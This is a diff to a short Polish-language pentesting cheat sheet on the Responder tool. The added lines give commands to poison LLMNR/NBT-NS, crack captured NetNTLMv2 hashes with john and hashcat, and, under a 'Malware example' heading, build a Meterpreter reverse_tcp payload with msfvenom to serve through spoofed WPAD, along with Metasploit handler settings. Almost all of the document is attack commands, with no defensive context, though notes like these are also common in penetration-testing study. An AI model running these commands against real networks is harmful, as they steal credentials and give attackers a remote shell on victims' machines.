@@ -6,11 +6,19 @@ Responder an LLMNR, NBT-NS and MDNS poisoner
 /usr/share/responder/Responder.conf
 ### Uses
 Zatruwanie i zbieranie hashy NTLM  
-``responder -I eth0``
+``responder -I eth0``  
+*(john hash1.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=netntlmv2)*  
+*(hashcat -m 5600 -a 0 hash1.txt /usr/share/wordlists/rockyou.txt --force --potfile-disable)*
 #### Podkladanie WPAD - fake www + malware
-``responder -i eth0 -wFfbv``  
+``responder -I eth0 -wFfbv``  
 *Serve-Html = on*  
-*Serve-Exe = on*
+*Serve-Exe = on*  
+##### Malware example  
+``msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=_IP_ lpost=4444 -f exe > payload.exe``  
+``use exploit/multi/handler``  
+``set lhost _IP_``  
+``set lport 4444``  
+``set payload windows/x64/meterpreter/reverse_tcp``  
 #### Podkladanie WPAD - fakowe windowsowe okno logowania do strony w przegladarce
 ``responder -I eth0 -r On -w On -wFb``  
 *Serve-Html = off*  
